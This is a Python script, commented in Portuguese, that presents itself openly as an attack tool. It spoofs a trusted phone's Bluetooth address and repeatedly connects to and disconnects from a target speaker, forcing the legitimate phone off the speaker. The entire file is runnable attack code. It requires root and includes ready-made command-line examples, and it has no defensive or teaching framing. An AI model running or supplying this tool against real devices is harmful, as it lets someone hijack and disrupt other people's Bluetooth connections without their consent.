#!/usr/bin/env python3
"""
Spoof de Endereço MAC em Conexões Confiadas
Spoofa o MAC de um dispositivo confiado para forçar desconexão
REQUER: Root + Adaptador compatível
"""

import subprocess
import sys
import time
import argparse
import os
import re

def check_root():
    return os.geteuid() == 0

def get_current_mac(interface='hci0'):
    """Obtém MAC atual do adaptador"""
    try:
        result = subprocess.run(['hciconfig', interface], 
                              capture_output=True, text=True, timeout=2)
        match = re.search(r'BD Address: ([0-9A-Fa-f:]{17})', result.stdout)
        if match:
            return match.group(1).upper()
    except:
        pass
    return None

def set_mac_address(interface='hci0', new_mac=None):
    """
    Altera MAC do adaptador Bluetooth
    """
    try:
        # Desligar interface
        subprocess.run(['hciconfig', interface, 'down'], 
                      check=True, timeout=2)
        time.sleep(0.5)
        
        if new_mac:
            # Alterar MAC (requer adaptador compatível)
            subprocess.run(['bdaddr', '-i', interface, new_mac], 
                          check=True, timeout=2)
        
        # Ligar interface
        subprocess.run(['hciconfig', interface, 'up'], 
                      check=True, timeout=2)
        time.sleep(0.5)
        
        return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        # bdaddr não instalado - tentar método alternativo
        return False

def scan_trusted_devices(target_mac):
    """
    Escaneia para identificar dispositivo confiado
    """
    print(f"[*] Escaneando dispositivo confiado: {target_mac}")
    
    try:
        # Usar hcitool para obter informações
        result = subprocess.run(['hcitool', 'info', target_mac],
                              capture_output=True, text=True, timeout=5)
        
        if 'Connection failed' in result.stdout:
            print(f"[-] Dispositivo {target_mac} não encontrado ou não conectado")
            return False
        
        print(f"[+] Dispositivo encontrado")
        print(result.stdout)
        return True
    except:
        return False

def spoof_and_disconnect(trusted_mac, target_speaker_mac, interface='hci0', duration=30):
    """
    Spoofa MAC confiado e força desconexão
    """
    print("=" * 60)
    print("    SPOOF DE MAC - ATAQUE EM CONEXÕES CONFIADAS")
    print("=" * 60)
    print()
    print(f"[*] MAC confiado (celular): {trusted_mac}")
    print(f"[*] Alvo (caixa de som): {target_speaker_mac}")
    print(f"[*] Interface: {interface}")
    print()
    
    # Salvar MAC original
    original_mac = get_current_mac(interface)
    if original_mac:
        print(f"[+] MAC original: {original_mac}")
    else:
        print("[!] Não foi possível obter MAC original")
    
    print("\n[*] Verificando se bdaddr está instalado...")
    try:
        subprocess.run(['which', 'bdaddr'], check=True, 
                      capture_output=True, timeout=1)
        print("[+] bdaddr encontrado")
    except:
        print("[!] bdaddr não encontrado")
        print("[!] Instale: sudo apt install bdaddr")
        print("[!] Ou compile de: https://github.com/jessesung/bdaddr")
        return
    
    # Verificar dispositivo confiado
    if not scan_trusted_devices(trusted_mac):
        print("[!] Não foi possível verificar dispositivo confiado")
        print("[!] Continuando mesmo assim...\n")
    
    print(f"\n[*] Iniciando spoof para {trusted_mac}...")
    print("[!] AVISO: Adaptador será desligado temporariamente\n")
    
    start_time = time.time()
    attempt = 0
    
    try:
        while time.time() - start_time < duration:
            attempt += 1
            
            # Spoof MAC
            if set_mac_address(interface, trusted_mac):
                print(f"[+] MAC alterado para {trusted_mac} (tentativa {attempt})")
                
                # Tentar conectar na caixa de som (força desconexão do original)
                time.sleep(1)
                
                try:
                    # Tentar pareamento/coneção
                    result = subprocess.run(['hcitool', 'cc', target_speaker_mac],
                                          capture_output=True, timeout=2)
                    
                    if result.returncode == 0:
                        print(f"[+] Conexão estabelecida com {target_speaker_mac}")
                        # Desconectar imediatamente
                        subprocess.run(['hcitool', 'dc', target_speaker_mac],
                                      capture_output=True, timeout=1)
                        print(f"[+] Desconexão forçada")
                    
                except:
                    pass
                
                # Restaurar MAC original
                time.sleep(0.5)
                if original_mac:
                    set_mac_address(interface, original_mac)
                    print(f"[+] MAC restaurado para {original_mac}")
            
            if attempt % 5 == 0:
                print(f"[*] {attempt} ciclos de spoof realizados...")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido")
    finally:
        # Restaurar MAC original
        if original_mac:
            print("\n[*] Restaurando MAC original...")
            set_mac_address(interface, original_mac)
            print(f"[+] MAC restaurado: {original_mac}")

def main():
    parser = argparse.ArgumentParser(
        description='Spoof de MAC em Conexões Confiadas',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
REQUER: Root + bdaddr instalado

Exemplos:
  sudo python3 mac_spoof_attack.py --trusted AA:BB:CC:DD:EE:FF --target 11:22:33:44:55:66
  sudo python3 mac_spoof_attack.py --trusted AA:BB:CC:DD:EE:FF --target 11:22:33:44:55:66 --duration 60

NOTA: Nem todos os adaptadores suportam mudança de MAC
      Funciona melhor com adaptadores USB (CSR, Broadcom)
        """
    )
    
    parser.add_argument('--trusted', '-t', required=True,
                       help='MAC do dispositivo confiado (celular)')
    parser.add_argument('--target', '-s', required=True,
                       help='MAC do alvo (caixa de som)')
    parser.add_argument('--duration', '-d', type=int, default=30,
                       help='Duração (segundos)')
    parser.add_argument('--interface', '-i', default='hci0',
                       help='Interface Bluetooth')
    
    args = parser.parse_args()
    
    if not check_root():
        print("[!] ERRO: Requer root!")
        sys.exit(1)
    
    trusted = args.trusted.upper().replace('-', ':')
    target = args.target.upper().replace('-', ':')
    
    for mac in [trusted, target]:
        if len(mac) != 17 or mac.count(':') != 5:
            print(f"[!] MAC inválido: {mac}")
            sys.exit(1)
    
    try:
        spoof_and_disconnect(trusted, target, args.interface, args.duration)
    except Exception as e:
        print(f"[!] Erro: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

